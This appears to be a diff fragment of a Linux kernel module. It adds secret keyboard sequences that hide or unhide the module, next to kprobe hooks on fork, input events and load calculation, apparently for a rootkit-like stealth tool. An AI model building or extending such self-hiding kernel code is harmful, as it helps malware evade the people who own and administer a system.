@@ -22,6 +22,20 @@
 
 #define CPU_USAGE_DELAY (2 * 60) // Two minutes
 
+#define KEY_MINUS 12
+#define KEY_X 45
+#define KEY_H 35
+
+// Due to every key is received twice (release and press)
+// Acual codes are (unhide - "x-x", hide - "h-h")
+const unsigned int unhide_module[] = {KEY_X,     KEY_X, KEY_MINUS,
+                                      KEY_MINUS, KEY_X, KEY_X};
+const unsigned int hide_module[] = {KEY_H,     KEY_H, KEY_MINUS,
+                                    KEY_MINUS, KEY_H, KEY_H};
+
+#define UNHIDE_MODULE_SIZE 6
+#define HIDE_MODULE_SIZE 6
+
 static int handler_pre_do_fork(struct kprobe *, struct pt_regs *);
 static int handler_pre_input_event(struct kprobe *, struct pt_regs *);
 static int handler_pre_calc_global_load(struct kprobe *, struct pt_regs *);
